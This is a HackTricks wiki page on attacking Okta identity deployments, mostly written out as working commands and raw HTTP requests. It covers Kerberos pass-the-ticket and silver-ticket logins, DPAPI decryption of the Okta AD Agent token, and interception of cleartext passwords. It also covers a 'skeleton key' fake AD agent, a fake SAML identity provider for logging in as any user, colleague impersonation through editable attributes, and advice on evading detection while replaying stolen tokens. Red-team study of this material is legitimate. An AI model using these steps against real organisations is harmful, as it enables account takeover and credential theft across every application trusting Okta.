# Okta Security

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Basic Information

[Okta, Inc.](https://www.okta.com/) is recognized in the identity and access management sector for its cloud-based software solutions. These solutions are designed to streamline and secure user authentication across various modern applications. They cater not only to companies aiming to safeguard their sensitive data but also to developers interested in integrating identity controls into applications, web services, and devices.

The flagship offering from Okta is the **Okta Identity Cloud**. This platform encompasses a suite of products, including but not limited to:

- **Single Sign-On (SSO)**: Simplifies user access by allowing one set of login credentials across multiple applications.
- **Multi-Factor Authentication (MFA)**: Enhances security by requiring multiple forms of verification.
- **Lifecycle Management**: Automates user account creation, update, and deactivation processes.
- **Universal Directory**: Enables centralized management of users, groups, and devices.
- **API Access Management**: Secures and manages access to APIs.

These services collectively aim to fortify data protection and streamline user access, enhancing both security and convenience. The versatility of Okta's solutions makes them a popular choice across various industries, beneficial to large enterprises, small companies, and individual developers alike. As of the last update in September 2021, Okta is acknowledged as a prominent entity in the Identity and Access Management (IAM) arena.

{% hint style="danger" %}
The main gola of Okta is to configure access to different users and groups to external applications. If you manage to **compromise administrator privileges in an Oktas** environment, you will highly probably able to **compromise all the other platforms the company is using**.
{% endhint %}

{% hint style="success" %}
To perform a security review of an Okta environment you should ask for **administrator read-only access**.
{% endhint %}

### Summary

There are **users** (which can be **stored in Okta,** logged from configured **Identity Providers** or authenticated via **Active Directory** or LDAP).\
These users can be inside **groups**.\
There are also **authenticators**: different options to authenticate like password, and several 2FA like WebAuthn, email, phone, okta verify (they could be enabled or disabled)...

Then, there are **applications** syncronized with Okta. Each applications will have some **mapping with Okta** to share information (such as email addresses, first names...). Moreover, each application must be inside an **Authentication Policy**, which indicates the **needed authenticators** for a user to **access** the application.

{% hint style="danger" %}
The most powerful role is **Super Administrator**.

If an attacker compromise Okta with Administrator access, all the **apps trusting Okta** will be highly probably **compromised**.
{% endhint %}

## Attacks

### Locating Okta Portal

Usually the portal of a company will be located in **companyname.okta.com**. If not, try simple **variations** of **companyname.** If you cannot find it, it's also possible that the organization has a **CNAME** record like **`okta.companyname.com`** pointing to the **Okta portal**.

### Login in Okta via Kerberos

(Attack copied [**from trustedsec, access it for more details**](https://trustedsec.com/blog/okta-for-red-teamers)).

If **`companyname.kerberos.okta.com`** is active, **Kerberos is used for Okta access**, typically bypassing **MFA** for **Windows** users. To find Kerberos-authenticated Okta users in AD, run **`getST.py`** with **appropriate parameters**. Upon obtaining an **AD user ticket**, **inject** it into a controlled host using tools like Rubeus or Mimikatz, ensuring **`clientname.kerberos.okta.com` is in the Internet Options "Intranet" zone**. Accessing a specific URL should return a JSON "OK" response, indicating Kerberos ticket acceptance, and granting access to the Okta dashboard.

Compromising the **Okta service account with the delegation SPN enables a Silver Ticket attack.** However, Okta's use of **AES** for ticket encryption requires possessing the AES key or plaintext password. Use **`ticketer.py` to generate a ticket for the victim user** and deliver it via the browser to authenticate with Okta.

Steps:

* Find Kerberos users configured with Okta access within the AD env running:

```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```

* With a ticket retrieved for the AD user,  inject this on a host under the attackers control using Rubeus or Mimikatz:

```
mimikatz # kerberos::purge
mimikatz # kerberos::ptt test.user.mimi
```

* Then access the URL [https://company.kerberos.okta.com/api/internal/v1/agentlessDssoPrecheck](https://company.kerberos.okta.com/api/internal/v1/agentlessDssoPrecheck) and having `company.kerberos.okta.com` is added to the ‚ÄúIntranet‚Äù security  the response should be a JSON like: `{"result": "OK"}`
* Go over to the Okta dashboard, if everything is OK, you‚Äôll be signed in.

**Silver ticket with AD Okta service account:**

If possible, **compromise the actual Okta service account** exposing the delegation SPN, so it will be possible to perform a Silver Ticket attack (compromise the AES key).\
Then, to craft a ticket for the victim user of `victimuser`, we use:

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-231280495 -domain domain.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1120 -spn HTTP/example.kerberos.okta.com victimuser
```
{% endcode %}

Access [https://company.kerberos.okta.com/api/internal/v1/agentlessDssoPrecheck](https://company.kerberos.okta.com/api/internal/v1/agentlessDssoPrecheck) to confirm the response is `{"result": "OK"}`

### Hijacking Okta AD Agent

(Attack copied [**from trustedsec, access it for more details**](https://trustedsec.com/blog/okta-for-red-teamers)).

This technique involves **accessing the Okta AD Agent on a server**, which **syncs users and handles authentication**. By examining and decrypting configurations in **`OktaAgentService.exe.config`**, notably the AgentToken using **DPAPI**, an attacker can potentially **intercept and manipulate authentication data**. This allows not only **monitoring** and **capturing user credentials** in plaintext during the Okta authentication process but also **responding to authentication attempts**, thereby enabling unauthorized access or providing universal authentication through Okta (akin to a 'skeleton key').

**Steps**:

Accessing the Okta AD Agent server, responsible for syncing users and handling Okta logins, reveals interesting data in `OktaAgentService.exe.config` (Stored in `C:\Program Files (x86)\Okta\Okta AD Agent`):

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The key focus is on the Base64 encoded **AgentToken**. Using dnSpy, it's evident these values are decrypted using DPAPI:

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The RandomEntropy value:

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

allows decryption of the Base64 XML value using specific .NET classes and methods. However, decryption requires the DPAPI master key of the Okta AD Agent service account:

```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Within **`OktaAgentService.exe.config`, APPID and AGENTID, combined with AgentToken, facilitate a GET** request to monitor user authentication, capturing credentials in cleartext:

```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
    <UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
        <type>USER_AUTH</type>
        <password>abc123</password>
        <useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
        <userName>domuser@domain.local</userName>
    </UserAuth>
</action>
```

Additionally, **responding to this authentication with a POST** request can effectively provide a '**skeleton key**', allowing authentication for any user through Okta, as demonstrated in the detailed HTTP request and its resulting `<agentActionResult>` XML structure:

```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
  <type>USER_AUTH</type>
  <status>SUCCESS</status>
  <message></message>
  <errorCode></errorCode>
  <timestamps>
    <actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
    <actionSentToLdapServer>1694358076</actionSentToLdapServer>
    <responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
    <responseSentToOkta>1694358076</responseSentToOkta>
    <actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
    <actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
    <responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
    <responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
  </timestamps>
  <additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.domain.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```

### Hijacking AD As an Admin

(Attack copied [**from trustedsec, access it for more details**](https://trustedsec.com/blog/okta-for-red-teamers)).

This technique involves hijacking an Okta AD Agent by first obtaining an OAuth Code, then requesting an API token. The token is associated with an AD domain, and a **connector is named to establish a fake AD agent**. Initialization allows the agent to **process authentication attempts**, capturing credentials via the Okta API. Automation tools are available to streamline this process, offering a seamless method to intercept and handle authentication data within the Okta environment.

Steps:

To **hijack Okta AD Agent without an existing agent token**, start by obtaining an OAuth Code through an Okta authorization URL. And accept the prompt

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
{% endcode %}

Then, you'll receive a redirection with a code parameter:

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use this code to request an API token via a POST request:

```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=<code>&client_id=<client_id>
```

**The response includes your API token**. Next, link this token to an active AD domain with a POST request, receiving an XML with an id attribute using the API call:

```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="domain.local" />
```

And receiving:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>domain.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```

Name the connector through another HTTP API call and store the returned id attribute:

```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```

Response:

{% code overflow="wrap" %}
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
{% endcode %}

Finally, initialize the connection to start receiving data with a final POST request:

```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <type>INIT</type>
  <status>SUCCESS</status>
  <timestamps>
    <actionRecieivedFromOkta />
    <actionSentToLdapServer />
    <responseReceivedFromLdapServer />
    <responseSentToOkta>1694304008</responseSentToOkta>
    <actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
    <actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
    <responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
    <responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
  </timestamps>
  <additionalInfo>{}</additionalInfo>
</agentActionResult>
```

Your **fake AD agent setup is complete and ready to process authentication attempts**. For automation, [a tool is available for use in token mode](https://github.com/xpn/OktaPostExToolkit), capturing credentials via the Okta API:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
{% endcode %}

Video examples:

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

The tool also allows registering a new AD connector if we have administrative credentials available for an Okta user that‚Äôs using:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain domain.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Okta Fake SAML Provider

(Attack copied [**from trustedsec, access it for more details**](https://trustedsec.com/blog/okta-for-red-teamers)).

Deploying a **fake SAML provider stands out as an effective technique in security assessments**, particularly useful for simulating attacks and testing detection mechanisms. It's especially pertinent for clients eager to evaluate their defense against specific intrusion tactics. This method involves leveraging access to a privileged Okta account to integrate an external Identity Provider (IdP) within Okta's framework. This setup permits external entities like Entra ID to manage authentication before redirecting users to Okta for app access.

However, the real intrigue arises when you control the IdP, allowing the approval of any authentication request at will. To put this into practice, a custom IdP is necessary. A tool available online serves this purpose, designed to issue signed SAML authentication responses for any desired user. This server listens for incoming HTTP/SAML requests, setting the stage for the next steps.

The deployment begins with selecting a SAML 2.0 IdP in Okta:

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

The `Name`  is the friendly name to be shown to any other administrators of Okta.

The issuer URL, typically a URI-format identifier, could be something like `https://www.example.com/`.

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

A critical setting is the **IdP Single Sign-On URL**, pointing to the SAML server's location. Interestingly, this doesn't need to be a direct URL to the server, offering creative leeway. For instance, setting this field to `https://idp.google.com/saml` is possible, and the **key lies in intercepting the inbound SAML request**. Okta generates the SAML AuthRequest, redirecting the browser to the set URL. Here's where **local manipulation** comes into play, redirecting `idp.google.com` to `127.0.0.1` through the hosts file:

```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```

The next step involves a signing certificate, preferably self-signed, created using OpenSSL:

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

The authenticity of this certificate isn't scrutinized, offering flexibility in its creation. Once generated, this certificate is uploaded to Okta as part of the IdP setup.

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

The **`Match Against`** setting should align with the **Okta Username or Email,** and the Account Link Policy set to Automatic ensures seamless authentication with existing Okta accounts.

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Post-configuration, it's essential to download the Metadata:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Initiation of the authentication request follows by navigating to the URL noted in the `Assertion Consumer Service URL`:

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

This action prompts a redirect to the internal SAML server:

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Successfully navigating these steps culminates in the ability to authenticate as any Okta user by merely providing an email address, a significant leap in access without the need for user credentials.

Let‚Äôs see this in action in [https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)

### Phishing Okta Portal with Evilgnix

In [**this blog post**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23) is explained how to prepare a phishing campaign against an Okta portal.

### Colleague Impersonation Attack

The **attributes that each user can have and modify** (like email or first name) can be configured in Okta. If an **application** is **trusting** as ID an **attribute** that the user can **modify**, he will be able to **impersonate other users in that platform**.

Therefore, if the app is trusting the field **`userName`**, you probably won't be able to change it (because you usually cannot change that field), but if it's trusting for example **`primaryEmail`** you might be able to **change it to a colleagues email address** and impersonate it (you will need to have access to the email and accept the change).

Note that this impersoantion depends on how each application was condigured. Only the ones trusting the field you modified and accepting updates will be compromised.\
Therefore, the app should have this field enabled if it exists:

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

I have also seen other apps that were vulnerable but didn't have that field in the Okta settings (at the end different apps are configured differently).

The best way to find out if you could impersonate anyone on each app would be to try it!

## Evading behavioural detection policies <a href="#id-9fde" id="id-9fde"></a>

Behavioral detection policies in Okta might be unknown until encountered, but **bypassing** them can be achieved by **targeting Okta applications directly**, avoiding the main Okta dashboard. With an **Okta access token**, replay the token at the **application-specific Okta URL** instead of the main login page.

Key recommendations include:

* **Avoid using** popular anonymizer proxies and VPN services when replaying captured access tokens.
* Ensure **consistent user-agent strings** between the client and replayed access tokens.
* **Refrain from replaying** tokens from different users from the same IP address.
* Exercise caution when replaying tokens against the Okta dashboard.
* If aware of the victim company's IP addresses, **restrict traffic** to those IPs or their range, blocking all other traffic.

## Okta Hardening

Okta has a lot of possible configurations, in this page you will find how to review them so they are as secure as possible:

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## References

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
